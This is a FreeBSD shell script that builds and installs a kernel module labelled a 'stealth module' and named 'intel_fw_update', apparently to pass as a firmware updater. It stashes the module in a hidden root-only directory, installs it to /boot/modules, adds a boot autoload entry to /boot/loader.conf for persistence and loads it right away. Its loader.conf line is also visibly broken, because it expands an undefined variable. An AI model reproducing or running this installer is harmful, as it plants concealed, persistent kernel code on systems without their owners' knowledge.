#!/bin/sh
set -e

MODULE_NAME="intel_fw_update"
MODULE_SRC="${MODULE_NAME}.ko"
HIDDEN_DIR="/usr/local/.intel_fw_update"
HIDDEN_KO_PATH="$HIDDEN_DIR/$MODULE_SRC"
LOADER_CONF="/boot/loader.conf"

echo "== [*] Checking for existing module =="

# Unload module if loaded
if kldstat | grep -q "$MODULE_NAME"; then
    echo "[*] Module $MODULE_NAME is loaded — unloading"
    kldunload "$MODULE_NAME"
fi

# Remove old entry in /boot/loader.conf
if grep -q "$MODULE_NAME" "$LOADER_CONF"; then
    echo "[*] Removing $MODULE_NAME from $LOADER_CONF"
    sed -i '' "/$MODULE_NAME/d" "$LOADER_CONF"
fi

# Remove installed module file
MODULE_PATH="/boot/modules/${MODULE_NAME}.ko"
if [ -f "$MODULE_PATH" ]; then
    echo "[*] Removing old $MODULE_PATH"
    rm -f "$MODULE_PATH"
fi

echo "== [*] Building and installing stealth module =="

# Build the module
echo "[*] Building module"
make clean
make

# Check .ko exists
if [ ! -f "$MODULE_SRC" ]; then
    echo "[!] Error: $MODULE_SRC not found"
    exit 1
fi

# Create hidden directory if needed
if [ ! -d "$HIDDEN_DIR" ]; then
    echo "[*] Creating hidden directory $HIDDEN_DIR"
    mkdir -p "$HIDDEN_DIR"
    chmod 700 "$HIDDEN_DIR"
fi

# Copy .ko to hidden directory
echo "[*] Copying $MODULE_SRC to hidden location $HIDDEN_KO_PATH"
cp "$MODULE_SRC" "$HIDDEN_KO_PATH"
chmod 600 "$HIDDEN_KO_PATH"

# Copy to boot modules
echo "[*] Installing module to $MODULE_PATH"
cp "$HIDDEN_KO_PATH" "$MODULE_PATH"

# Add to /boot/loader.conf for boot autoload
echo "[*] Adding $MODULE_NAME to $LOADER_CONF"
echo "$MODULE_NAME_load=\"YES\"" >> "$LOADER_CONF"

# Load the module now
echo "[*] Loading module using kldload"
kldload "$MODULE_NAME"

echo "== [✓] Installation and persistence setup complete =="